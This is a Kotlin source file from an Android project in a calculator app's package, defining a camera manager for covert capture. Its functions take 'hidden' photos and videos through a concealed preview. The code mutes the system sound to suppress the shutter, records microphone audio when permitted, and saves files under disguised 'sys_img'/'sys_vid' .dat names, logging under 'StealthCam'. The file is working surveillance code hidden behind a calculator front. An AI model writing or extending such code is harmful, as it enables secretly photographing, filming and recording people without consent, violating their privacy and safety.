package org.solovyev.android.calculator

import android.content.Context
import android.media.AudioManager
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.FileOutputOptions
import androidx.camera.video.Quality
import androidx.camera.video.QualitySelector
import androidx.camera.video.Recorder
import androidx.camera.video.Recording
import androidx.camera.video.VideoCapture
import androidx.camera.video.VideoRecordEvent
import androidx.camera.view.PreviewView
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object VideoRecorderManager {

    private var imageCapture: ImageCapture? = null
    private var videoCapture: VideoCapture<Recorder>? = null
    private var recording: Recording? = null
    private var orientationEventListener: android.view.OrientationEventListener? = null
    var isVideoRecording = false
        private set

    fun isImageCaptureReady(): Boolean = imageCapture != null
    fun isVideoCaptureReady(): Boolean = videoCapture != null

    // Java-friendly overloads: Kotlin default parameters are not visible to Java callers,
    // so the 5-arg primary must be wrapped for 3-arg and 4-arg Java call sites.
    fun bindCamera(
        context: Context,
        lifecycleOwner: LifecycleOwner,
        hiddenPreview: PreviewView?
    ) = bindCamera(context, lifecycleOwner, hiddenPreview, null, null)

    fun bindCamera(
        context: Context,
        lifecycleOwner: LifecycleOwner,
        hiddenPreview: PreviewView?,
        onReady: Runnable?
    ) = bindCamera(context, lifecycleOwner, hiddenPreview, onReady, null)

    fun bindCamera(
        context: Context,
        lifecycleOwner: LifecycleOwner,
        hiddenPreview: PreviewView?,
        onReady: Runnable? = null,
        onFailed: Runnable? = null
    ) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()
                val preview = Preview.Builder().build()
                if (hiddenPreview != null) {
                    preview.setSurfaceProvider(hiddenPreview.surfaceProvider)
                }
                
                imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()
                
                val recorder = Recorder.Builder()
                    .setQualitySelector(QualitySelector.from(Quality.SD))
                    .build()
                
                videoCapture = VideoCapture.withOutput(recorder)
                
                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(
                    lifecycleOwner, 
                    CameraSelector.DEFAULT_BACK_CAMERA, 
                    preview, 
                    imageCapture, 
                    videoCapture
                )
                
                if (orientationEventListener == null) {
                    orientationEventListener = object : android.view.OrientationEventListener(context) {
                        override fun onOrientationChanged(orientation: Int) {
                            if (orientation == android.view.OrientationEventListener.ORIENTATION_UNKNOWN) return
                            val rotation = when (orientation) {
                                in 45..134 -> android.view.Surface.ROTATION_270
                                in 135..224 -> android.view.Surface.ROTATION_180
                                in 225..314 -> android.view.Surface.ROTATION_90
                                else -> android.view.Surface.ROTATION_0
                            }
                            imageCapture?.targetRotation = rotation
                            videoCapture?.targetRotation = rotation
                        }
                    }
                }
                orientationEventListener?.enable()
                android.util.Log.d("StealthCam", "bindCamera OK; imageCapture=" + (imageCapture != null) + " videoCapture=" + (videoCapture != null))
                onReady?.run()
            } catch (e: Exception) {
                Log.e("CameraX", "相机绑定失败", e)
                // Drop any half-initialised instances so a later readiness check is correct.
                imageCapture = null
                videoCapture = null
                onFailed?.run()
            }
        }, ContextCompat.getMainExecutor(context))
    }

    fun startHiddenVideoRecording(
        context: Context,
        onStartSuccess: Runnable,
        onStopCallback: Runnable,
        onNotReady: Runnable? = null
    ) {
        if (recording != null) return
        val currentVideoCapture = videoCapture ?: run { onNotReady?.run(); return }

        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val videoFile = File(context.filesDir, "sys_vid_$timeStamp.dat")
        val outputOptions = FileOutputOptions.Builder(videoFile).build()

        // Record WITH an audio track when the microphone permission is granted; otherwise
        // fall back to a silent (no-audio) video so the action is still effective instead of
        // doing nothing when RECORD_AUDIO is missing. onStartSuccess fires in both cases.
        val prepare = currentVideoCapture.output.prepareRecording(context, outputOptions)
        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
            prepare.withAudioEnabled()
        }
        recording = prepare.start(ContextCompat.getMainExecutor(context)) { event ->
            if (event is VideoRecordEvent.Finalize) {
                recording = null
                isVideoRecording = false
                onStopCallback.run()
            }
        }
        isVideoRecording = true
        onStartSuccess.run()
    }

    fun stopHiddenVideoRecording(onStopCommand: Runnable) {
        if (recording == null) return
        recording?.stop()
        recording = null
        isVideoRecording = false
        onStopCommand.run()
    }

    fun takeHiddenPhoto(
        context: Context,
        onCaptureInitiated: Runnable,
        onCaptureCompleted: Runnable,
        onNotReady: Runnable? = null,
        onFailed: Runnable? = null
    ) {
        android.util.Log.d("StealthCam", "takeHiddenPhoto called; imageCapture=" + (imageCapture != null))
        val currentImageCapture = imageCapture ?: run { onNotReady?.run(); return }
        
        onCaptureInitiated.run()

        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val originalSystemVolume = audioManager.getStreamVolume(AudioManager.STREAM_SYSTEM)
        try {
            audioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
        } catch (e: Exception) {
            Log.e("CameraX", "无法静音系统音量", e)
        }

        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val photoFile = File(context.filesDir, "sys_img_$timeStamp.dat")
        android.util.Log.d("StealthCam", "takePicture -> " + photoFile.absolutePath)
        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

        currentImageCapture.takePicture(
            outputOptions, 
            ContextCompat.getMainExecutor(context), 
            object : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                    android.util.Log.d("StealthCam", "onImageSaved -> exists=" + photoFile.exists() + " size=" + photoFile.length() + " path=" + photoFile.absolutePath)
                    try {
                        audioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, originalSystemVolume, 0)
                    } catch (e: Exception) {}
                    onCaptureCompleted.run()
                }

                override fun onError(exc: ImageCaptureException) {
                    android.util.Log.e("StealthCam", "takePicture onError", exc)
                    try {
                        audioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, originalSystemVolume, 0)
                    } catch (e: Exception) {}
                    onFailed?.run()
                }
            }
        )
    }
}
